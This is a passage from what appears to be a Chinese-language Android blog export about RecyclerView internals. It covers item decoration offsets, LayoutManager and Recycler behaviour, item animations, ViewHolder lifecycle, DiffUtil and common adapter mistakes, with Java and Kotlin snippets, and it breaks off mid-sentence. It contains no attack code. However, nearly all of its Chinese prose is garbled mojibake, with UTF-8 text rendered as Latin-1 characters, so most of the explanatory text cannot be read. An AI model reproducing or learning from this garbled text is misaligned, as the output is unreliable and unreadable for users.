åœ¨æŒ‡å®šäº†Column countä¹‹åï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨æ ¹æ®å½“å‰å®½åº¦(æ¯”æ–¹è¯´å±å¹•å®½åº¦)å»é™¤ä»¥columnCountè®¡ç®—å®é™…itemçš„å®½åº¦ã€‚æ·»åŠ äº†itemDecoration,å¹¶ä¸”åœ¨getItemOffsetä¸­è®¾ç½®äº†outRectçš„å®½åº¦ä¹‹åï¼Œchildçš„å®½åº¦è®¡ç®—ç»“æœå°±å˜å¾—å¥‡æ€ªäº†ã€‚ä¼¼ä¹æ˜¯æ¯ä¸€ä¸ªchildåœ¨getItemOffsetä¸­è®¾ç½®çš„å·¦å³å®½åº¦è¢«è¢«åŠ æƒåˆ°æœ€ç»ˆå®½åº¦çš„è®¡ç®—ä¸­äº†ã€‚æˆ‘å°è¯•æ‰‹åŠ¨ç²¾ç¡®è®¡ç®—æ¯ä¸€ä¸ªchildåœ¨æ‰£é™¤äº†æ‰€æœ‰ä¸­é—´çš„gapä¹‹åçš„å®½åº¦ï¼Œå¼ºåˆ¶è®¾ç½®å®½åº¦ä¸ºä¸€è‡´ã€‚æœ€ç»ˆå¾—åˆ°çš„viewçš„å®½åº¦æ˜¯å¯¹çš„ï¼Œä½†æ˜¯leftå’Œrightæ€»æ˜¯åç§»äº†ã€‚ æœ€ç»ˆæ”¹æˆäº†è¿™æ ·æ‰è¾¾åˆ°é¢„æœŸçš„æ•ˆæœ recyclerView.layoutParms?.run { leftMargin = 15dp rightMargin = 15dp } val offset = 10dp when (position%4) { 0 -&gt; outRect?.set(offset/2, 0, offset/2, 0) 1 -&gt; outRect?.set(offset/2, 0, offset/2, 0) 2 -&gt; outRect?.set(offset/2, 0, offset/2, 0) 3 -&gt; outRect?.set(offset/2, 0, offset/2, 0) } RecyclerViewçš„å·¦å³å„ä½¿ç”¨15dpçš„è¾¹è·ï¼Œè¿™æ ·å‰©ä¸‹çš„æ¯ä¸€ä¸ªæ¨ªæ’çš„itemViewï¼ŒoutRectçš„å·¦å³éƒ½éœ€è¦è®¾ç½®ä¸º5dpã€‚ä»è€Œå®ç°itemViewå®½åº¦ä¸€è‡´ï¼Œgapå¤§å°ä¸ä¸€è‡´çš„æ•ˆæœã€‚ å‘2Recylerviewä¼šåœ¨æŸä¸€ä¸ªchild requestFocusä¹‹åè«åå…¶å¦™çš„æ»‘åŠ¨ä¸€æ®µè·ç¦»onRequestChildFocus æˆ‘ç†è§£è¿™æ ·çš„æœ¬æ„æ˜¯ç”¨äºchatè¿™æ ·çš„åœºæ™¯ï¼Œè‡ªåŠ¨focusåˆ°æ–°çš„itemViewä¸Šï¼Œè§£å†³æ–¹æ¡ˆæ˜¯åœ¨onRequestChildFocusä¸­è¿”å›trueï¼Œè¿™æ ·å°±ä¸ä¼šè«åå…¶å¦™çš„æ»‘åŠ¨äº†recyclerViewå¥‡æ€ªçš„æ»‘åŠ¨æˆ‘ä¹Ÿæ˜¯æŠŠæ–­ç‚¹æ‰“åœ¨canScrollVerticallyä¸Šæ‰å‘ç°çš„ 2. LayoutManager Recycler AdapterLayoutManageræ°¸è¿œæ°¸è¿œæ°¸è¿œä¸è¦ç¢°Adapter!!! 3.Recycleræ„é€ Recyclerå†…éƒ¨æœ‰ä¸¤ä¸ªé›†åˆ: Scrap Heap ï¼š detachAndScrapView() æš‚æ—¶ä¸ç”¨çš„Viewä¸¢åˆ°è¿™é‡Œï¼Œéšæ—¶å–å›ä½¿ç”¨ Recycle Pool: removeAndRecycleView() ç¡®å®šä¸éœ€è¦çš„Viewä¸¢åˆ°è¿™é‡Œï¼Œæ‹¿å›æ¥æ—¶positionæˆ–è€…dataå˜äº† 4.FillGaps,æœ€é‡è¦çš„æ–¹æ³• Discover firstVisible position/location æ‰¾åˆ°layout Gaps findFirstVisiblePosition Scrap everything(ä¸¢åˆ°ScrapHeap) /** * Temporarily detach and scrap all currently attached child views. Views will be scrapped * into the given Recycler. The Recycler may prefer to reuse scrap views before * other views that were previously recycled. * * @param recycler Recycler to scrap views into */ public void detachAndScrapAttachedViews(Recycler recycler) { final int childCount = getChildCount(); for (int i = childCount - 1; i &gt;= 0; i--) { final View v = getChildAt(i); scrapOrRecycleView(recycler, i, v); } } Lay out all visible positions for(...){ int nextPosition = ...; View view = recycler.getViewForPosition(nextPosition); addView(view); //æ³¨æ„è¿™é‡Œçš„Measureå’ŒLayoutä¸æ˜¯å¹³æ—¶ä½¿ç”¨çš„measureChildå’Œlayoutæ–¹æ³•ï¼ŒåŸå› æ˜¯ItemDecoration measureChildWithMargin(view,...) layoutDecorated(view,....) } Recycle remaining views final List&lt;RecyclerView.ViewHolder&gt; scrapList = recycler.getScrapList(); for(int i=0;i&lt;scrapList.size;i++){ final View removingView = scrapList.get(i); recycler.recycleView(removingView); } æ³¨æ„: ä¸¢åˆ°RecyclerPoolçš„Viewçš„viewHolderã€LayoutParamséƒ½è¢«æ¸…é™¤æ‰ 4. Scrolläº‹ä»¶ public int scrollHorizontallyBy(int dx, RecyclerView.Recycler recycler, RecyclerView.State state) { //dx è¡¨ç¤ºç³»ç»Ÿæ ¹æ®ä¼ å…¥çš„TouchEventå‘Šè¯‰ä½ åº”è¯¥æ»‘åŠ¨å¤šå°‘ dx &lt;0 å†…å®¹å‘å³æ»‘åŠ¨ dx &gt; 0å†…å®¹å‘å·¦æ»‘åŠ¨ //è¿™ä¸ªæ­£è´Ÿå·å’ŒScrollByé‚£ä¸ªæ˜¯ä¸€æ ·çš„é‚ªé—¨ //è¿”å›å€¼æ˜¯ä½ å‘Šè¯‰ç³»ç»Ÿä½ å®é™…æ»‘åŠ¨äº†å¤šå°‘ offsetChildrenHorizontal(delta);//è°ƒç”¨è¯¥æ–¹æ³•ä¼šå¸®åŠ©ä½ ç§»åŠ¨æ‰€æœ‰çš„ChildViewï¼Œæ¯”ä¸€ä¸ªä¸ªIterateæ–¹ä¾¿å¤šäº† } 5.notifyDataSetChanged()è°ƒç”¨äº†ä»€ä¹ˆå‡½æ•°æœ€ç»ˆä¼šèµ°åˆ°onLayoutChildrenè¿™é‡Œé¢ï¼Œå°±è·Ÿé‡æ–°èµ°ä¸€élayoutå°±å¯ä»¥äº† 6.ScrollToPosition()å’ŒSmoothScrollToPosition()ä¸¤è€…çš„å®ç°çš„ä¸åŒ:scrollToPosition:Track Requested Positionã€Trigger requestLayoutSmoothscrollToPosition: Create a SmoothScroller instanceã€Set the Target Positionã€invoke startSmoothScrollSmoothScrolleræ˜¯ä¸€ä¸ªæ¥å£ï¼Œåœ¨é‡Œé¢å®ç°computeScrollVectorForPositionè¿”å›éœ€è¦åˆ°è¾¾çš„ä½ç½® 7. supportPredictiveItemAnimationä¸»è¦ç”¨äºItemChange Animationä¸»è¦åœ¨å‘ç”Ÿå˜åŒ–æ—¶å±•ç¤ºåŠ¨ç”»ã€‚å¦‚æœæƒ³è¦åœ¨æ»‘åŠ¨è¿‡ç¨‹ä¸­å±•ç¤ºåŠ¨ç”»çš„è¯ï¼Œå¯ä»¥è€ƒè™‘åœ¨onViewAttachedToWindowæˆ–è€…onBindViewHolderé‡Œé¢ç»™Viewæ·»åŠ TranslationXï¼ˆä»å·¦è¾¹å‡ºæ¥ï¼‰ï¼ŒAlpha(é€æ˜åº¦ä»0å˜æˆ1)ï¼Œæˆ–è€…ScaleXç­‰ç­‰ è¿™ç¯‡æ–‡ç« æœ€åˆæ˜¯æ‰“ç®—ç¿»è¯‘Dave Smithçš„ä¸€æ¬¡æ¼”è®²çš„ï¼Œåé¢å†³å®šåŠ ä¸ŠStaggeredGridLayoutMangerçš„åŸç†è§£æ Reference Dave Smith 500px","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"}]},{"title":"ä½¿ç”¨RecyclerViewçš„Animation","date":"2016-10-20T16:16:49.000Z","path":"2016/10/20/2016-10-20-RecyclerViewAnimationStuff/","text":"From the talkRecyclerView Animations and Behind the ScenesYigit Biyar &amp; Chet Haaseon Anroid Dev Summit 2015 1. RecyclerViewæ¶æ„RecyclerView is Flexible , Pluggable and Customizeableå†…éƒ¨å¾ˆå¤šåŠŸèƒ½éƒ½äº¤ç»™äº†å„ä¸ªç»„ä»¶å»å®ŒæˆChildHelper ã€AdapterHelper ã€Recyclerå¯¹äºå¼€å‘è€…æ¥è¯´å¹¶ä¸å¸¸ç”¨ï¼Œä½†å®ƒä»¬åœ¨å†…éƒ¨è´Ÿè´£äº†è®¸å¤šé’ˆå¯¹Child Viewçš„ç®¡ç†ã€‚ ViewHolderçš„åˆ›å»º1 .LayoutManageré¦–å…ˆæ£€æŸ¥getViewForPositionï¼ŒRecyclerViewæŸ¥æ‰¾Cache(getViewForPosition)ï¼Œå¦‚æœæ‰¾åˆ°äº†ã€‚ç›´æ¥äº¤ç»™LayoutManager,è¿™ä¸€è¿‡ç¨‹ç”šè‡³ä¸éœ€è¦ä¸Adapteræ¥è§¦ã€‚ å¦‚æœCacheä¸­æœªæ‰¾åˆ°ï¼ŒRecyclerViewè°ƒç”¨Adpterçš„getViewTypeï¼Œå¹¶å»Recycled Poolä¸­getViewHolderByTypeã€‚ å¦‚æœåœ¨Poolä¸­æœªæ‰¾åˆ°ï¼ŒRecyclerViewå°†è°ƒç”¨Adapterçš„createViewHolderã€‚ å¦‚æœåœ¨Poolä¸­è¿™ç§Typeçš„ViewHolderå·²ç»æœ‰äº†ï¼Œæˆ–è€…æ­¥éª¤3ä¸­åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„viewHolderï¼ŒbindViewHolderå¹¶äº¤ç»™LayoutManagerã€‚ æœ€ç»ˆLayoutManagerå°†æŠŠè¿™ä¸ªViewæ·»åŠ åˆ°UIï¼Œè¿™æ—¶ä¼šè°ƒç”¨RecyclerViewçš„onViewAttachedToWindowå›è°ƒï¼ˆç”Ÿå‘½å‘¨æœŸï¼‰ã€‚ ViewHolderçš„å›æ”¶(Reserves) LayoutManagerè°ƒç”¨removeAndRecycleViewï¼ŒRecyclerViewä¼šåœ¨è¿™é‡Œæ”¶åˆ°å›è°ƒonViewDetachedFromWindow æ£€æŸ¥è¿™ä¸ªView.isValidã€‚è¿™ä¸€ç‚¹å¾ˆé‡è¦ï¼Œåœ¨scrollè¿‡ç¨‹ä¸­ï¼Œå¦‚æœä¸€ä¸ªViewæ˜¯Validçš„è¯ï¼Œå¯ä»¥å°†Viewæ·»åŠ åˆ°Cacheä¸­ï¼Œéšåå¯ä»¥ç®€å•å°†å…¶å¤ç”¨ã€‚Cacheå°†ä¼šinvalidate oldest oneï¼Œå¹¶å‘Šè¯‰Adapter(onViewRecycled)ã€‚ å¦‚æœä¸æ˜¯Validçš„Viewï¼Œå°†ä¼šè¢«æ·»åŠ åˆ°Poolä¸­ï¼ŒAdapterä¼šæ”¶åˆ°onViewRecycledå›è°ƒã€‚ ViewHolderçš„å¦ä¸€ç§æ›´å¥½çš„å›æ”¶æ–¹å¼(Fancy Reserves!) LayoutManagerè°ƒç”¨onLayoutChildren Layoutå®Œæˆåï¼ŒRecyclerViewæ£€æŸ¥é‚£äº›ä¹‹å‰å·²ç»è¢«layoutäº†çš„ä½†ä¸å†å­˜åœ¨äºå±å¹•ä¸Šäº†ã€‚RecyclerViewå°†è¿™äº›Viewé‡æ–°æ·»åŠ åˆ°ViewGroupä¸­ï¼Œè¿™äº›Viewæ­¤æ—¶å¯¹LayoutManagerä¸å¯è§ã€‚é‡æ–°æ·»åŠ çš„ç›®çš„åœ¨äºåŠ¨ç”»ã€‚ RecyclerViewè¿™æ—¶å€™æŠŠè¿™äº›æœ¬ä¸è¯¥addçš„Viewäº¤ç»™ItemAnimatorï¼Œåè€…è°ƒç”¨åŠ¨ç”»æ•ˆæœï¼Œ300ms(å®‰å“ä¸­å¤§éƒ¨åˆ†é»˜è®¤åŠ¨ç”»æ—¶é—´æ˜¯300ms)ä¹‹åï¼Œè°ƒç”¨onAnimationFinishedï¼Œå‘Šè¯‰RecyclerView. æ¥ç€RecyclerViewé€šçŸ¥Adapter(onViewDetachedFromWindow) æœ€åå°†è¿™äº›Viewæ·»åŠ åˆ°Cacheæˆ–è€…Recycled Poolã€‚ ViewHolderçš„é”€æ¯ LayoutManagerè°ƒç”¨removeAndRecycleViewï¼ŒRecyclerViewæ£€æŸ¥Viewæ˜¯å¦valid å¦‚æœä¸æ˜¯Validï¼Œæ·»åŠ åˆ°RecycledPoolä¸­ï¼Œä½†åœ¨è¿™ä¹‹å‰å…ˆæ£€æŸ¥æ˜¯å¦ hasTransientStateï¼ˆä¾‹å¦‚æ­£åœ¨è¿è¡ŒåŠ¨ç”»ï¼‰ å¦‚æœè¿™ä¸ªViewæ­£å¥½å¤„åœ¨Animationä¸­ï¼Œä¸€äº›å±æ€§è¢«Animatingï¼Œ Poolä¼šè°ƒç”¨Adapterçš„onFailedToRecycle(Adapterä¸­åº”è¯¥å¤å†™è¿™ä¸ªæ–¹æ³•ï¼Œå–æ¶ˆåŠ¨ç”») onFailedToRecycle(ViewHolder)è¿”å›trueçš„è¯ï¼ŒPoolå°†æ— è§†Viewçš„TransientStateå¹¶å›æ”¶è¿™ä¸ªView(å¯èƒ½å¤„åœ¨åŠ¨ç”»ä¸­) å¦ä¸€ç§å¯èƒ½å¯¼è‡´ViewHolderè¢«é”€æ¯çš„æ–¹å¼RecyclerViewå°†Viewæ·»åŠ åˆ°Poolä¸­(å®é™…è°ƒç”¨çš„æ˜¯addViewHolderToRecycledViewPool(ViewHolder))ï¼ŒPoolä¼šæ£€æŸ¥è¿™ç§typeçš„ViewHolderæ˜¯å¦è¿˜æ”¾å¾—ä¸‹ï¼ˆä¾‹å¦‚type xçš„ViewHolderå·²ç»æœ‰5ä¸ªäº†ï¼Œå®åœ¨å¤ªå¤šäº†ï¼‰ï¼Œè¿™ç§æƒ…å†µä¸‹å°±ä¼šKillè¿™ç§View,è¿™ç§æƒ…å†µæ˜¯æˆ‘ä»¬å¸Œæœ›é¿å…çš„ã€‚å¼€å‘è€…å¯ä»¥è°ƒç”¨pool.setMaxRecycledViews(type,count)æ¥è®©Poolæ”¾æ›´å¤šçš„Holder per typeã€‚ ä¸€äº›éœ€è¦æ³¨æ„çš„ï¼ŒPoolæ˜¯åŸºäºä¸€ä¸ªActivity Contextçš„ã€‚ 2. ä½¿ç”¨LayoutManageré…åˆItemAnimatorè‡ªå®šä¹‰ItemViewçš„åŠ¨ç”»çš„æ­¥éª¤perdictiveItemAnimationçš„å…³é”®åœ¨äºRecyclerViewçš„listå¹¶ä¸å±€é™äºå±å¹•ã€‚åœ¨LayoutManagerä¸­å¤å†™ supportPredictiveItemAnimations()ï¼Œè¿”å›trueã€‚ LinearLayoutMangerçš„å®ç° @Override public boolean supportsPredictiveItemAnimations() { return mPendingSavedState == null &amp;&amp; mLastStackFromEnd == mStackFromEnd; } å¯ä»¥è®¤ä¸ºè¿”å›å€¼å°±æ˜¯true onLayoutChildernåœ¨è¿™ç§æƒ…å†µä¸‹ä¼šè¢«è°ƒç”¨ä¸¤æ¬¡ï¼Œ(ä¹‹å‰æåˆ°æœ¬è¯¥è¢«ç§»é™¤çš„Viewéœ€è¦é‡æ–°æ·»åŠ åˆ°ViewGroupä¸­ï¼Œå®ç°å°±åœ¨è¿™é‡Œ)å‚è€ƒLinearLayoutManagerçš„å®ç°ï¼Œæºä»£ç å®åœ¨å¤ªé•¿ï¼Œåªå¤åˆ¶ä¸€äº›æ³¨é‡Š @Override public void onLayoutChildren(RecyclerView.Recycler recycler, RecyclerView.State state) { // layout algorithm: // 1) by checking children and other variables, find an anchor coordinate and an anchor // item position. // 2) fill towards start, stacking from bottom // 3) fill towards end, stacking from top // 4) scroll to fulfill requirements like stack from bottom. // create layout state //omitted.... } ç®€å•æ¥è¯´ä¸€å…±ä¸‰æ­¥: detach and Scrap Views layouté‚£äº›éœ€è¦å‡ºç°åœ¨listä¸­çš„View(åŒ…æ‹¬å°†è¦æ¶ˆå¤±çš„View) æ¥ä¸‹æ¥è¿›å…¥ç¬¬äºŒæ­¥layoutï¼Œåœ¨è¿™é‡Œç¡®å®šé‚£äº›å°†å‡ºç°åœ¨å±å¹•å¤–çš„Viewçš„å®é™…ä½ç½®ã€‚ è¿™æ ·LayoutManagerå°±èƒ½å°†å¿…è¦çš„ä¿¡æ¯ä¼ é€’ç»™ItemAnimator è¿›å…¥ItemAnimatorå¤§éƒ¨åˆ†çš„éœ€è¦å®ç°çš„å‡½æ•°åœ¨SimpleItemAnimatoræˆ–è€…DefaultItemAnimatoré‡Œé¢éƒ½å·²ç»å®ç°å¥½äº†ï¼Œæ‰€ä»¥å¤§éƒ¨åˆ†äººçš„é€‰æ‹©å°±æ˜¯ï¼š ä½¿ç”¨DefaultItemAnimator(é»˜è®¤å·²ç»è®¾ç½®å¥½äº†) Implement SimpleItemAnimator(æˆ–è€…DeafaultItemAnimator)ï¼Œå¤å†™ä¸€äº›å¿…è¦çš„æ–¹æ³• Animatoréœ€è¦åšçš„ä¸€äº›äº‹ record[Pre|Post]LayoutInformation//è®°å½•åŠ¨ç”»å¼€å§‹å’Œç»“æŸçš„layoutä¿¡æ¯ animate[Appearance|Disappearance] animatePersistence()//ä¸ä¼šæ”¹å˜ä½ç½® animateChange()//å®é™…çš„åŠ¨ç”»æ·»åŠ ä½ç½® è¿™äº›åœ¨DefaultItemAnimatorä¸­éƒ½æœ‰é»˜è®¤çš„å®ç°åŠ¨ç”»å®Œæˆåä¸€å®šè¦è°ƒç”¨ DispatchAnimationFinished(ViewHolder) è®°å½•åŠ¨ç”»å¼€å§‹å‰å’Œç»“æŸåçš„ä¿¡æ¯ï¼Œå®ä¾‹ä»£ç : @NonNull @Override public ItemHolderInfo recordPreLayoutInformation(RecyclerView.State state, RecyclerView.ViewHolder viewHolder, int changeFlags, List&lt;Object&gt; payloads) { ColorTextInfo info = (ColorTextInfo) super.recordPreLayoutInformation(state, viewHolder, changeFlags, payloads); return getItemHolderInfo((MyViewHolder) viewHolder, info); } @NonNull @Override public ItemHolderInfo recordPostLayoutInformation(@NonNull RecyclerView.State state, @NonNull RecyclerView.ViewHolder viewHolder) { ColorTextInfo info = (ColorTextInfo) super.recordPostLayoutInformation(state, viewHolder); return getItemHolderInfo((MyViewHolder) viewHolder, info); } @Override public ItemHolderInfo obtainHolderInfo() { return new ColorTextInfo(); } canReuseViewHolderçš„ä½œç”¨:ä¾‹å¦‚notifyItemChanged(position)åï¼Œåªæ˜¯æŸä¸ªä½ç½®çš„viewHolderå‘ç”Ÿäº†ä¿¡æ¯æ”¹å˜ï¼Œé‚£å°±æ²¡æœ‰å¿…è¦åˆ›å»ºä¸€ä¸ªæ–°çš„ViewHolderï¼Œç›´æ¥æä¾›åŸæœ‰çš„ViewHolderï¼Œæå‡æ€§èƒ½ã€‚ 3. å¸¸è§é”™è¯¯ mAdapter.notifyItemMoved(1,5)ä¸ä¼šè°ƒç”¨onBindViewHolderï¼Œä¸ä¼šinvalidate ä¸è¦åœ¨onBindViewHolderä¸­æ·»åŠ onClickListener(ä»¥åŒ¿åå†…éƒ¨ç±»çš„æ–¹å¼,è¿™ä¼šä½¿å¾—positionå˜æˆfinal),æƒ³è±¡ä¸€ä¸‹ï¼ŒmAdapter.notifyItemMoved(1,5)è°ƒç”¨åä¸ä¼šè°ƒç”¨onBindViewHolderï¼Œè¿™ä½¿å¾—ç‚¹å‡»pos 1æ—¶å®é™…ä¼ é€’ç»™listenerçš„æ˜¯pos 5ã€‚ æ£€æŸ¥RecyclerView.NO_POSITIONè¿™ä¸ªIntå€¼ä¸º-1ï¼Œå…¶å®å°±æ˜¯itemViewè¢«removedï¼Œä½†ç”¨æˆ·æ‰‹å¤Ÿå¿«ï¼Œåœ¨Viewè¢«ç§»é™¤å‰ç‚¹å‡»äº†è¿™ä¸ªViewï¼Œé‚£è¿™ä¸ªonClickListenerè¿˜æ˜¯ä¼šè¢«è°ƒç”¨ã€‚ mAdapter.notifyItemChanged(position,payload)å¦‚æœæŸä¸ªViewHolderä¸­åªæ˜¯ä¸€éƒ¨åˆ†ä¿¡æ¯æ”¹å˜ï¼Œå°†æ›´æ–°å†…å®¹ä¸¢åˆ°payloadä¸­ï¼Œæœ€ç»ˆä¼šè°ƒç”¨åˆ°onBindViewHolder(ViewHolder,position,List Payloads)ï¼Œåœ¨è¿™é‡Œåªéœ€è¦æŠŠViewHolderä¸­çš„ä¸€å°éƒ¨åˆ†æ”¹å˜å°±å¯ä»¥äº†ï¼Œè¿™æœ‰åŠ©äºä¼˜åŒ–æ–°èƒ½ã€‚ onCreateViewHolderå¿…é¡»è¿”å›ä¸€ä¸ªnew ViewHolderï¼Œä¸èƒ½åœ¨æœ¬åœ°ä½œä¸ºæˆå‘˜å˜é‡è¿”å›ã€‚ RecyclerView.setRecycledViewPool(pool)ä¸€ä¸ªpoolåªèƒ½ä¸ºä¸ºåŒä¸€ä¸ªcontext(Activity)ä¸­çš„RecyclerViewä½¿ç”¨ï¼Œå› ä¸ºè¿™äº›Viewæ˜¯ä¸Contextç›¸å…³çš„ï¼Œè€Œä¸åŒçš„Activityå¯èƒ½æœ‰ä¸åŒçš„Themeï¼ŒStyleã€‚ Pro RecyclerViewæœ€è¿‘çœ‹åˆ°yigitåœ¨relamä½œçš„å…³äºrecyclerViewçš„æ¼”è®²ï¼Œè®°å½•ä¸‹æ¥ä¸€äº›æ¯”è¾ƒé‡è¦çš„ç‚¹ view:: requestLayoutçš„æ•ˆæœï¼ŒrequestLayoutä¼šä¸€ç›´åœ°å‘ä¸Šè¯·æ±‚ç›´åˆ°æ ¹è§†å›¾ï¼Œnext Frameå¼€å§‹æ—¶ï¼Œæ‰€æœ‰çš„å­Viewéƒ½å°†è°ƒç”¨è‡ªèº«çš„measure(onMeasure)å’Œlayout(onLayout)æ–¹æ³•å¦‚æœå­Viewä¸æ›¾requestLayout,ä¹‹å‰çš„measureç»“æœä¼šè¢«cacheä¸‹æ¥ï¼ŒèŠ‚çœmeasureå’Œlayoutçš„æ—¶é—´ã€‚ åœ¨RecyclerViewä¸­ï¼Œåœ¨itemViewçš„onBIndViewæ–¹æ³•ä¸­è°ƒç”¨ImageLoaderçš„åŠ è½½å›¾ç‰‡æ–¹æ³•ï¼Œç”±äºå›¾ç‰‡åŠ è½½æ˜¯å¼‚æ­¥æ“ä½œï¼Œæœ€ç»ˆä¼šè°ƒç”¨ImageViewçš„setImageBitmapæ–¹æ³•ã€‚è€Œåœ¨ImageViewçš„å®ç°ä¸­ï¼ŒsetImageBitmapæ–¹æ³•æœ€ç»ˆä¼šè°ƒç”¨requestLayoutæ–¹æ³•ï¼Œæœ€ç»ˆä¼šä¸€å±‚å±‚å‘ä¸Šä¼ é€’åˆ°recyclerViewä¸­ï¼Œå°±åƒè¿™æ ·`javaimageView setImageBitmap imageView requestLayout itemView requestLayout recyclerView requestLayout è€ŒrecyclerViewçš„requestLayoutæ–¹æ³•ä¼šåœ¨next Frameé‡æ–°positionæ‰€æœ‰çš„child(very expensive!)ä¸ºæ­¤ï¼ŒrecyclerViewæä¾›äº†ä¸€ä¸ªsetHasFixedSizeæ–¹æ³•ï¼Œè®¾ç½®ä¸ºtrueè¡¨æ˜recyclerViewè‡ªèº«ä¸ä¼šå› ä¸ºchildViewçš„å˜åŒ–è€Œresizeï¼Œè¿™æ ·recyclerVeiwå°±ä¸ä¼šè°ƒç”¨requestLayoutæ–¹æ³•(å¦‚æœå»çœ‹RecyclerViewçš„æºç ï¼Œå¯ä»¥çœ‹åˆ°mEatRequestLayoutè¿™ä¸ªå˜é‡ï¼Œä¹Ÿå°±æ˜¯é¿å…é‡å¤è°ƒç”¨requestLayouté€ æˆæ€§èƒ½æŸè€—ã€‚)ï¼Œä¸ä¼šé€ æˆæ‰€æœ‰çš„childViewéƒ½è¢«é‡æ–°æµ‹é‡ä¸€éã€‚åœ¨ImageView(2011å¹´ä¹‹åçš„ç‰ˆæœ¬)ä¸­ï¼ŒsetImageDrawableæ–¹æ³•å¤§è‡´é•¿è¿™æ ·ï¼š ```java void setImageDrawable(Drawable drawable){ if(mDrawable != drawable){ int oldWidth = mDrawableWidth; int oldHeight = mDrawableHeight; updateDrawable(drawable) if(oldWidth!=mDrawableWidth||oldHeight!=mDrawableHeight){ requestLayout(); } invalidate(); } } ç®€å•æ¥è¯´å°±æ˜¯åˆ¤æ–­ä¸‹å‰åå›¾åƒçš„å®½åº¦æˆ–é«˜åº¦æ˜¯å¦å‘ç”Ÿäº†å˜åŒ–ï¼Œå¦‚æœæ— å˜åŒ–åˆ™ä¸éœ€è°ƒç”¨requestLayoutæ–¹æ³•ï¼Œåªéœ€è¦reDrawã€‚ä¹Ÿå°±é¿å…äº†è¿™ç§æ€§èƒ½çš„æŸè€—ã€‚ä½†æ˜¯ï¼ŒTextViewçš„implementationåˆ™å¤æ‚çš„å¤šï¼Œå¹¶æ²¡æœ‰è¿™ç§ä¼˜åŒ–ã€‚å®é™…æ“ä½œä¸­ï¼ŒAPIåº”è¯¥èƒ½å¤Ÿå‘Šè¯‰å®¢æˆ·ç«¯å›¾ç‰‡çš„widthå’ŒHeight,ä½¿ç”¨AspectRationImageViewåŠ è½½å›¾ç‰‡ã€‚åœ¨å›¾ç‰‡åŠ è½½å®Œæˆä¹‹å‰ä¼˜å…ˆä½¿ç”¨PlaceHolderï¼Œå¹¶è®¾å®šå¥½åŠ è½½å®Œæˆåº”æœ‰çš„å°ºå¯¸ï¼Œè¿™æ ·å°±é¿å…äº†åæœŸå›¾ç‰‡åŠ è½½å®Œæˆåçš„requestLayoutã€‚ ä½¿ç”¨SortedListç”¨äºè¿›è¡ŒListå˜æ›´`javaSortedList mSortedList = new SortedList(Item.class, new SortedListAdapterCallback(mAdapter)){ //overrideä¸‰ä¸ªæ–¹æ³•ï¼Œæ‡’å¾—æŠ„äº† }ä½¿ç”¨æ–¹å¼ååˆ†ç®€å•ï¼Œåé¢çš„æ•°æ®æ›´æ–°æ“ä½œåŒ…æ‹¬notifyDataChangeéƒ½è¢«å¤„ç†å¥½äº†ã€‚onNetwokCallback(List news){ mSortedList.addAll(news);} å¯¹äºæœªå‘ç”Ÿå˜åŒ–çš„Itemï¼Œå°†ç›´æ¥è·³è¿‡ï¼Œå®ç°äº†æœ€ä¼˜åŒ–çš„åˆ—è¡¨æ•°æ®æ›´æ–°ã€‚ - DiffUtil(added in 24.2.0)ç”¨äºå¯¹æ¯”æ•°æ®å˜æ›´å‰åçš„ä¸¤ä¸ªList ```java DiffResult result = DiffUtil.calculateDiff( new MyCallback(oldList,newList)); mAdapter.setItems(newList); result.dispatchTo(mAdapter); åªéœ€è°ƒç”¨ä¸Šè¿°æ–¹æ³•å³å¯å®ç°åˆ—è¡¨Itemæ›´æ–°åŠAdapterçš„notifyã€‚DiffUtilçš„callbackæœ‰å››ä¸ªæ–¹æ³•éœ€è¦å¤å†™ï¼Œå¦å¤–æœ‰ä¸€ä¸ªæ–¹æ³•ç”¨äºå•ä¸ªItemçš„éƒ¨åˆ†payloadæ›´æ–°ã€‚åœ¨mediumä¸Šæ‰¾åˆ°ä¸€ä¸ªç°æˆçš„ï¼Œç›´æ¥å€Ÿç”¨äº†ã€‚ public class MyDiffCallback extends DiffUtil.Callback{ List&lt;Person&gt; oldPersons; List&lt;Person&gt; newPersons; public MyDiffCallback(List&lt;Person&gt; newPersons, List&lt;Person&gt; oldPersons) { this.newPersons = newPersons; this.oldPersons = oldPersons; } @Override public int getOldListSize() { return oldPersons.size(); } @Override public int getNewListSize() { return newPersons.size(); } @Override public boolean areItemsTheSame(int oldItemPosition, int newItemPosition) { return oldPersons.get(oldItemPosition).id == newPersons.get(newItemPosition).id; } @Override public boolean areContentsTheSame(int oldItemPosition, int newItemPosition) { return oldPersons.get(oldItemPosition).equals(newPersons.get(newItemPosition)); } @Nullable @Override public Object getChangePayload(int oldItemPosition, int newItemPosition) { //you can return particular field for changed item.//è¿™é‡Œçš„objectä¼šè¢«å¸¦åˆ°onBindViewHolderä¸­ return super.getChangePayload(oldItemPosition, newItemPosition); } } è¿™äº›æ–¹æ³•ä¼šå¸®åŠ©å®Œæˆremoveå’Œaddç­‰æ–¹æ³•ã€‚ viewHolderçš„ç”Ÿå‘½å‘¨æœŸ onCreateonBindViewHolder(è·å–videoèµ„æº)onViewAttachedToWindow(å¯ä»¥åœ¨è¿™é‡Œå¼€å§‹æ’­æ”¾è§†é¢‘)onViewDetachedFromWindow(å¯ä»¥åœ¨è¿™é‡Œåœæ­¢æ’­æ”¾è§†é¢‘ï¼Œéšæ—¶æœ‰å¯èƒ½é‡æ–°è¢«ç›´æ¥attachï¼Œè¿™è¿‡ç¨‹ä¸­ä¸ä¼šè°ƒç”¨onBindæ–¹æ³•)onRecycled(å¯ä»¥åœ¨è¿™é‡Œé‡Šæ”¾Videoèµ„æºæˆ–è€…é‡Šæ”¾Bitmapå¼•ç”¨ï¼Œè¿™ä¹‹åå†ä½¿ç”¨è¯¥ViewHolderéœ€è¦è°ƒç”¨onBindæ–¹æ³•) recyclerViewçš„ä¸€äº›deferæ“ä½œå¯¹äºæ—¥å¸¸å¼€å‘çš„å¸®åŠ©recyclerViewä¼šå°†ä¸€äº›pendingæ“ä½œdeferåˆ°next frameã€‚eg:`javarecyclerView.scrollToPosition(15);int x = layoutManager.getFirstVisiblePosition();//æ­¤æ—¶xå¹¶ä¸ç­‰äº15ï¼Œå› 